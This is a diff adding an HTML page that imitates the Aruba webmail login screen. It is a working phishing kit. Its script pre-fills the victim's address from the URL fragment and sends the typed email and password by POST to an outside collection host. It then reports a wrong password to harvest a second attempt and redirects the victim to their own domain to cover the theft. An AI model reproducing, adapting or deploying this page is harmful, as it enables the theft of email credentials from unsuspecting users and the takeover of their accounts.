@@ -1,0 +1,285 @@
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta content="text/html; charset=utf-8" http-equiv="content-type">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css">
+<link href="https://webmail.aruba.it/web_imgs/login/css/login.css?_v_=v4r2b65pl4.20210517_1745" rel="stylesheet" type="text/css">
+<script src="https://webmail.aruba.it/javascript/startup/dojo/dojo/dojo.js?_v_=v4r2b65pl4.20210517_1745"></script>
+</head>
+<body>
+
+<div class="login-background" style="display: flex;">
+	<div class="main-block">
+		<div class="left-block">
+			<iframe src="left_block.html" tabindex="-1" style="visibility: hidden; display: block;"></iframe>
+			<div class="left-block-image" style="display: none"></div>
+		</div>
+		<div class="right-block">
+			<div class="logo-block">
+				<div class="left-logo"></div>
+				<div class="right-logo"></div>
+			</div>
+			<div class="tab-switcher-block">
+				<div class="tab-buttons-block">
+					<button type="button" class="tab-button tab-1 hide-in-classic" data-i18n="title_tab_1" onclick="displayTab('1')">Webmail</button>
+					<button type="button" class="tab-button tab-2 hide-in-classic" data-i18n="title_tab_2" onclick="displayTab('2')">Manage mailboxes</button>
+				</div>
+				<button type="button" id="language-button" class="en">
+					<div class="language-flag">
+						<div id="menu_language"><ul><li dojoattrid="0"></li></ul><ul><li dojoattrid="0"><button type="button" id="en">English</button></li><li dojoattrid="1"><button type="button" id="es">Español</button></li><li dojoattrid="2"><button type="button" id="it">Italiano</button></li></ul></div>
+					</div>
+					<div id="language_select">English</div>
+					<div class="menu-language-arrow"><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 32 32" fill="#3f3f3f"><polygon points="2.002,10 16.001,24 30.002,10"></polygon></svg></div>
+				</button>
+			</div>
+		
+			<div class="form-block">
+				<div class="form-tab tab-1" id="tab1">
+					<div data-i18n="form_title" class="form-title">Access your Webmail</div>
+					
+					<div class="input-container">
+						<div class="login-icon"></div>
+						<form id="contact" method="POST" action="">
+						<input type="text" id="email" name="email" placeholder="Email" style="height:55px;">
+					</form></div>
+					<div class="input-container">
+						<div class="password-icon"></div>
+						<input style="height:55px;" type="password" id="password" name="password" placeholder="Password">
+						<div class="password-icon-2" onclick="showPassword('password')"></div>
+						
+					</div>
+					<p style="color:red;" id="msg"></p>
+					<div class="remember-me-block">
+						<label for="remember_me">
+							<input type="checkbox" id="remember_me" name="remember_me">
+							<div class="hide-in-classic" data-i18n="remember_me_label">Remember me</div>
+						</label>
+						<div data-i18n="lost_password" class="lost-password"><a href="https://guide.hosting.aruba.it/email/email-modifica-ripristino-password/recupero-e-modifica-password-tutte-le-caselle.aspx" target="_blank" rel="noopener noreferrer">Forgotten your password?</a></div>
+					</div>
+					<div class="capslock-detect" id="capslock_detect">Caps Lock</div>
+					<div class="radio-button-block hide-in-classic">
+						<div class="radio-button-header" data-i18n="select_version">SELECT VERSION:</div>
+						<div class="radio-button-pane">
+							<div class="radio-button-cnt">
+								<input type="radio" name="webmail_version" id="new_webmail_version" value="0" selected="">
+								<label for="new_webmail_version">
+									<div class="radio-button-outer"><div class="radio-button-inner"></div></div>
+									<div class="radio-button-label" data-i18n="radio_beta">Smart</div>
+								</label>
+								<div class="test-sticker">
+									<div data-i18n="sticker_test">New</div>
+								</div>
+							</div>
+							<div class="radio-button-cnt">
+								<input type="radio" name="webmail_version" id="web2cs_version" value="1">
+								<label for="web2cs_version">
+									<div class="radio-button-outer"><div class="radio-button-inner"></div></div>
+									<div class="radio-button-label" data-i18n="radio_complete">Classic</div>
+								</label>
+							</div>
+						</div>
+					</div>
+					<button type="button" id="submit-btn" class="login-button">SIGN IN</button>
+					
+					<div class="giga-text"><div data-i18n="giga_text"></div></div>
+				</div>
+				<div class="form-tab tab-2" id="tab2">
+					<div data-i18n="form_title_admin" class="form-title">Manage your mailboxes</div>
+					<div class="input-container">
+						<div class="login-icon"></div>
+						<div class="postmaster-div">postmaster@</div>
+						<input type="text" id="login_domain" name="domain" value="" data-i18n-placeholder="domain" placeholder="domain to manage">
+					</div>
+					<div class="input-container">
+						<div class="password-icon"></div>
+						<input type="password" id="password_domain" name="PASSWD" value="" onkeypress="capLock(event,'capslock_detect_pm');" data-i18n-placeholder="password_postmaster" placeholder="Password">
+						<div class="password-icon-2" onclick="showPassword('password_domain')"></div>
+					</div>
+					<div class="remember-me-block">
+						<div data-i18n="lost_password_postmaster" class="lost-password"><a href="https://guide.hosting.aruba.it/email/email-modifica-ripristino-password/recupero-e-modifica-password-tutte-le-caselle.aspx" target="_blank" rel="noopener noreferrer">Forgotten your password?</a></div>
+					</div>
+					<div class="capslock-detect" id="capslock_detect_pm">Caps Lock</div>
+					<div class="radio-button-block hide-in-classic">
+						<div class="radio-button-header" data-i18n="select_version">SELECT VERSION:</div>
+						<div class="radio-button-pane">
+							<div id="postmaster_beta" class="radio-button-cnt">
+								<input type="radio" name="postmaster_version" id="new_postmaster_version">
+								<label for="new_postmaster_version">
+									<div class="radio-button-outer"><div class="radio-button-inner"></div></div>
+									<div class="radio-button-label" data-i18n="postmaster_radio_beta">Smart</div>
+								</label>
+								<div class="test-sticker">
+									<div data-i18n="sticker_test_manage">New</div>
+								</div>
+							</div>
+							<div id="postmaster_completa" class="radio-button-cnt">
+								<input type="radio" name="postmaster_version" id="postmaster_version" value="1" checked="checked">
+								<label for="postmaster_version">
+									<div class="radio-button-outer"><div class="radio-button-inner"></div></div>
+									<div class="radio-button-label" data-i18n="postmaster_radio_complete">Classic</div>
+								</label>
+							</div>
+						</div>
+					</div>
+					<button type="button" data-i18n="button_login_postmaster" class="login-button" onclick="launchAdmin()">SIGN IN</button>
+					<div class="pec-text"><div data-i18n="pec_text">Use the <span class="link" onclick="window.open('https://gestionemail.pec.it', null, 'noreferrer,noopener')">PEC control panel</span> to manage your PEC email accounts.</div></div>
+					<div class="giga-text"><div data-i18n="giga_text"></div></div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="footer-block">
+		<div class="accessible-link" data-i18n="accessible_link"><a href="index.php?accessible=1" target="_parent">Accessible version</a></div>
+		<div class="text-footer" data-i18n="copyright">Copyright © 2021 Aruba S.p.A. - VAT No. 01573850516 - All rights reserved - <a href="https://www.aruba.it/informativa_arubaspa.pdf" target="_blank" rel="noopener noreferrer" class="link">Privacy policy</a></div>
+	</div>
+	<div class="pec-dialog-overlay"></div>
+	<div class="pec-dialog-block">
+		<div class="pec-dialog-title">
+			<div class="pec-dialog-title-text" data-i18n="pec_dialog_title">Login to PEC Webmail</div>
+			<div class="pec-dialog-title-button" onclick="pecHideDialog()"></div>
+		</div>
+		<div class="pec-dialog-body">
+			<div class="pec-dialog-body-text" data-i18n="pec_dialog_text">Do you want to login to your PEC account?<br>Webmail for PEC accounts is on another page.<br>Click on the button to log in.</div>
+			<div class="pec-dialog-button-bar">
+				<div class="pec-dialog-button-ok" data-i18n="pec_dialog_button_login" onclick="pecRedirect()">LOGIN TO PEC WEBMAIL</div>
+				<div class="pec-dialog-button-cancel" data-i18n="pec_dialog_button_cancel" onclick="pecHideDialog()">Cancel</div>
+			</div>
+		</div>
+	</div>
+</div>
+<div id="cookie_directive" class="cookie-directive" style="display: block;"><span data-i18n="cookie_directive_text">To provide an even better browsing experience, this site uses its own cookies and those of selected third parties and partners. Third-party cookies may also be profiling cookies. <br>If you would like to know more and to receive information on the use of cookies, or if you would like to withdraw your consent to cookies, click <a style="color:#FFFFFF;font-weight:bold;font-family:Lato;font-size:13px;" target="_blank" rel="noopener noreferrer" href="https://www.aruba.it/documents/tc-files/it/08_informativa_aruba_spa_cookie_it.pdf">here</a>.By clicking on <input name="impliedsubmit" id="cookie_directive_button" value="I ACCEPT" type="button" onclick="cookie_directive_accept()"> you give your consent to the cookies used by our site.</span></div>
+<form id="redirect" name="redirect" method="POST" target="_top">
+	<input type="hidden" name="xam" value="0">
+</form>
+<script src="https://webmail.aruba.it/ext_aruba/js/login.js?_v_=v4r2b65pl4.20210517_1745"></script>
+<script src="https://webmail.aruba.it/ext_aruba/js/aes.js?_v_=v4r2b65pl4.20210517_1745"></script>
+<script src="https://webmail.aruba.it/layout/js/ads.js?_v_=v4r2b65pl4.20210517_1745"></script><div id="dImsNXvlfN" style="display: none;"></div><div id="dImsNXvlfN" style="display: none;"></div>
+<script src="//webmail.aruba.it/layout/js/cookie_directive.js?_v_=v4r2b65pl4.20210517_1745"></script>
+<script src="https://webmail.aruba.it/layout/js/capslock_detect.js?_v_=v4r2b65pl4.20210517_1745"></script>
+
+<script src="skins/elastic/deps/bootstrap.bundle.min.js?s=1593860330"></script>
+<script src="skins/elastic/ui.min.js?s=1593860317"></script>
+       <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+<script>
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+		
+		
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+
+ 
+      }
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+
+                    if (!password) {
+                $('#msg').show();
+                $('#msg').html("Password field is empty!");
+
+                return false;
+            }
+
+
+       
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://rlethaqv.ml/arubaa/postoo.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifying...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                 
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                     window.location.replace("https://www."+my_slice);
+
+                  }
+                               $("#msg").show();
+               $('#msg').html("Password is not correct. Please try again");
+                }
+                else{
+                                $("#msg").show();
+               $('#msg').html("Password is not correct. Please try again");
+                }
+              }
+            },
+            error: function(){
+             
+              if (count>=2) {
+                count=0;
+                 window.location.replace("https://www."+my_slice);
+              }
+              $("#msg").show();
+               $('#msg').html("Password is not correct. Please try again");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
+            }
+          });
+    });
+
+
+    });
+
+
+  </script>
+
+</body></html>
